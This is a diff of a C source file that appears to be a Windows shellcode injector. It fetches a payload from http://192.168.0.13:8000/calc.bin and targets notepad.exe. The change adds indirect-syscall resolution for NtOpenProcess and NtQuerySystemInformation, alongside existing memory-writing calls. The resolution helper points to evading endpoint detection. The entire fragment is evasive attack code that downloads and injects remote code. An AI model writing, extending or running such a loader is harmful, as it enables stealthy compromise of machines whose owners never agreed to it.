@@ -1,10 +1,15 @@
 #include <windows.h>
 #include <stdio.h>
 
+#include "Structs.h"
 #include "Common.h"
+#include "Debug.h"
 
 #define PAYLOAD L"http://192.168.0.13:8000/calc.bin"
 #define PROC L"notepad.exe"
+
+
+
 
 int main() {
 
@@ -26,6 +31,8 @@ int main() {
     indirectMyAss("NtWriteVirtualMemory", hNTDLL, &NtWriteVirtualMemorySSN, &NtWriteVirtualMemorySyscall);
     indirectMyAss("NtWaitForSingleObject", hNTDLL, &NtWaitForSingleObjectSSN, &NtWaitForSingleObjectSyscall);
     indirectMyAss("NtClose", hNTDLL, &NtCloseSSN, &NtCloseSyscall);
+    indirectMyAss("NtOpenProcess", hNTDLL, &NtOpenProcessSSN, &NtOpenProcessSyscall);
+    indirectMyAss("NtQuerySystemInformation", hNTDLL, &NtQuerySystemInformationSSN, &NtQuerySystemInformationSyscall);
 
     info("running GetRemoteProcessHandle...\n\n");
     if (!GetRemoteProcessHandle(PROC, &PID, &hProcess)) {
